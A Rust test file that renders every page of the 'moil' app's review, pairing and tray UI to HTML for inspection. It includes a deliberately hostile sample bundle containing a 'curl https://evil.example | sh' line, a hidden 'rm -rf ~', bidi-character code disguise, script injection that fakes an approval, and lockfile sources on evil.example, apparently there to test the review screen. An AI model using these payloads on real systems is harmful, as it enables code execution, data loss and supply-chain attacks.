//! Every page the app shows, written to files for a look in a browser or
//! with `tools/snapshot.swift`:
//!
//! ```sh
//! MOIL_APP_GALLERY=/tmp/gallery cargo test -p moil-app gallery -- --ignored
//! ```

use std::path::Path;
use std::time::{Duration, Instant, SystemTime};

use moil_agent::{Approval, BundleStatus, Connection, Pairing, Review, Service, ServiceStatus};
use moil_bundle::Bundle;
use moil_proto::BundleInfo;

use crate::backend::PairingCode;
use crate::demo;
use crate::icon;
use crate::ipc::{PairMessage, ReviewMessage};
use crate::page;
use crate::pair::PairWindow;
use crate::review::ReviewWindow;
use crate::unpair::UnpairWindow;
use crate::view::{Activity, IconState};

/// The tray icon in every state, magnified and at menu-bar size, on light
/// and dark bars.
fn icons() -> String {
    let mut cells = String::new();
    for attention in [false, true] {
        for activity in [Activity::Idle, Activity::Running, Activity::Paused] {
            let image = icon::draw(
                IconState {
                    activity,
                    attention,
                },
                icon::TRAY_SIZE,
            );
            let mut rects = String::new();
            for y in 0..image.height {
                for x in 0..image.width {
                    let alpha = image.rgba[((y * image.width + x) * 4 + 3) as usize];
                    if alpha > 0 {
                        rects.push_str(&format!(
                            r#"<rect x="{x}" y="{y}" width="1" height="1" fill-opacity="{:.3}"/>"#,
                            f32::from(alpha) / 255.0
                        ));
                    }
                }
            }
            for (bar, ink) in [("#f2f2f2", "#000"), ("#2b2b2b", "#fff")] {
                cells.push_str(&format!(
                    r#"<div style="background:{bar};padding:8px;display:inline-block;margin:4px">
                    <svg width="144" height="144" viewBox="0 0 36 36" fill="{ink}" shape-rendering="crispEdges">{rects}</svg>
                    <svg width="18" height="18" viewBox="0 0 36 36" fill="{ink}">{rects}</svg>
                    <div style="font:11px system-ui;color:{ink}">{activity:?}{}</div></div>"#,
                    if attention { " + attention" } else { "" }
                ));
            }
        }
        cells.push_str("<br>");
    }
    format!("<!DOCTYPE html><html><body style=\"margin:8px\">{cells}</body></html>")
}

fn klisi(approved: &[&Bundle]) -> Service {
    let now = SystemTime::now();
    Service {
        id: "klisi.example.com".parse().unwrap(),
        base_url: "https://klisi.example.com/moil".parse().unwrap(),
        name: "klisi".into(),
        pairing: Some(Pairing {
            base_url: "https://klisi.example.com/moil".parse().unwrap(),
            machine_id: "m_7Hq2Xk9Lw3".into(),
            paired_at: now - Duration::from_secs(64 * 86400),
        }),
        approvals: approved
            .iter()
            .map(|b| Approval {
                hash: b.hash(),
                name: b.manifest().name.clone(),
                version: b.manifest().version.clone(),
                approved_at: now - Duration::from_secs(23 * 86400),
            })
            .collect(),
    }
}

fn review_page(review: Review, tweak: impl FnOnce(&mut ReviewWindow)) -> String {
    let mut window = ReviewWindow::new(
        review.service.id.clone(),
        review.service.name.clone(),
        review.bundle.hash(),
    );
    window.loaded(Ok(review));
    tweak(&mut window);
    window.render(SystemTime::now())
}

/// A bundle that tries everything a hostile author might.
fn hostile() -> Bundle {
    let script = "# /// script\n# requires-python = \">=3.12\"\n# dependencies = []\n# ///\n\
        import os\n\n\
        access_level = \"user\u{202e} \u{2066}# admins only\u{2069} \u{2066}\"\n\
        if access_level != \"user\":  # check\u{200b}\n    os.system(\"curl https://evil.example | sh\")\n\
        </pre><script>window.ipc.postMessage('{\"type\":\"approve\"}')</script>\n\
        x = 1                                                                                                                              ; os.system('rm -rf ~')\n";
    let lockfile = "version = 1\nrevision = 3\n\n\
        [[package]]\nname = \"requests\"\nversion = \"2.32.3\"\nsource = { registry = \"https://pypi.org/simple\" }\nwheels = [{ hash = \"HASH\" }]\n\n\
        [[package]]\nname = \"patched\"\nversion = \"0.1.0\"\nsource = { git = \"https://evil.example/patched?rev=main#0123456789abcdef0123456789abcdef01234567\" }\n\n\
        [[package]]\nname = \"mirror-pkg\"\nversion = \"1.0\"\nsource = { registry = \"https://pypi.evil.example/simple\" }\nwheels = [{ hash = \"HASH\" }]\n\n\
        [[package]]\nname = \"tarball\"\nversion = \"3.0\"\nsource = { url = \"https://evil.example/tarball-3.0.tar.gz\" }\nsdist = { hash = \"HASH\" }\n"
        .replace("HASH", "sha256:a7db850025b95ded1eae8a46181a1a6c56c92c96f0e2b005d9ff8dc0210cab44");
    let manifest = r#"{"moil": 1, "name": "totally-safe", "version": "1.0", "description": "Nothing to see here </p><script>alert(1)</script>"}"#;
    Bundle::new(script, lockfile, manifest).unwrap()
}

#[test]
#[ignore = "writes every page to $MOIL_APP_GALLERY"]
fn gallery() {
    let dir = std::env::var("MOIL_APP_GALLERY").expect("set MOIL_APP_GALLERY to a directory");
    let dir = Path::new(&dir);
    std::fs::create_dir_all(dir).unwrap();
    let write =
        |name: &str, html: String| std::fs::write(dir.join(format!("{name}.html")), html).unwrap();
    let (v2, v3) = (demo::transcribe_0_2(), demo::transcribe_0_3());

    write(
        "review-update",
        review_page(
            Review {
                service: klisi(&[&v2]),
                bundle: v3.clone(),
                previous: Some(v2.clone()),
                approved: false,
            },
            |_| {},
        ),
    );
    write(
        "review-first",
        review_page(
            Review {
                service: klisi(&[]),
                bundle: v2.clone(),
                previous: None,
                approved: false,
            },
            |_| {},
        ),
    );
    write(
        "review-approved",
        review_page(
            Review {
                service: klisi(&[&v2]),
                bundle: v2.clone(),
                previous: None,
                approved: true,
            },
            |_| {},
        ),
    );
    write(
        "review-error",
        review_page(
            Review {
                service: klisi(&[&v2]),
                bundle: v3.clone(),
                previous: Some(v2.clone()),
                approved: false,
            },
            |window| {
                window.on_message(ReviewMessage::Approve { hash: v3.hash() });
                window.finished(Err("Couldn't reach klisi: the connection timed out.".into()));
            },
        ),
    );
    let mut service = klisi(&[]);
    service.base_url = "http://lab.local:8080/moil".parse().unwrap();
    write(
        "review-hostile",
        review_page(
            Review {
                service,
                bundle: hostile(),
                previous: None,
                approved: false,
            },
            |_| {},
        ),
    );
    let loading = ReviewWindow::new("klisi.example.com".parse().unwrap(), "klisi", v3.hash());
    write("review-loading", loading.render(SystemTime::now()));
    let mut failed = ReviewWindow::new("klisi.example.com".parse().unwrap(), "klisi", v3.hash());
    failed.loaded(Err(format!("the service has no bundle {}", v3.hash())));
    write("review-failed", failed.render(SystemTime::now()));

    let now = Instant::now();
    let code = PairingCode {
        user_code: "WDJB-MJHT".into(),
        verification_uri: "https://klisi.example.com/machines/pair".into(),
        verification_uri_complete: "https://klisi.example.com/machines/pair?code=WDJB-MJHT".into(),
        service_name: "klisi".into(),
        expires_at: now + Duration::from_secs(600),
    };
    write("pair-enter", PairWindow::new(None).render(now));
    let link = "https://klisi.example.com/moil".parse().unwrap();
    write("pair-link", PairWindow::from_link(&link).render(now));
    let mut bad = PairWindow::new(None);
    bad.on_message(PairMessage::Start {
        url: "ftp://klisi.example.com".into(),
    });
    write("pair-bad-address", bad.render(now));
    let mut flow = PairWindow::new(None);
    flow.on_message(PairMessage::Start {
        url: "klisi.example.com/moil".into(),
    });
    write("pair-starting", flow.render(now));
    flow.started(1, Ok(code));
    write("pair-confirming", flow.render(now));
    let mut failed = PairWindow::new(None);
    failed.on_message(PairMessage::Start {
        url: "klisi.example.com/moil".into(),
    });
    failed.started(
        1,
        Ok(PairingCode {
            user_code: "WDJB-MJHT".into(),
            verification_uri: String::new(),
            verification_uri_complete: String::new(),
            service_name: "klisi".into(),
            expires_at: now,
        }),
    );
    failed.finished(1, Err("the pairing was rejected on the service".into()));
    write("pair-failed", failed.render(now));
    flow.finished(1, Ok("klisi".into()));
    write("pair-paired", flow.render(now));

    let status = ServiceStatus {
        id: "klisi.example.com".parse().unwrap(),
        name: "klisi".into(),
        base_url: "https://klisi.example.com/moil".parse().unwrap(),
        connection: Connection::Connected,
        bundles: vec![BundleStatus {
            info: BundleInfo {
                hash: v2.hash(),
                name: "transcribe".into(),
                version: "0.2.0".into(),
                description: None,
            },
            approved: true,
        }],
        insecure: false,
    };
    write("unpair", UnpairWindow::new(&status).render());
    write("icons", icons());
    write(
        "notice",
        page::notice(
            "moil couldn't start",
            "moil is already running for /Users/ada/.moil; quit it first",
            "Quit",
        ),
    );
}
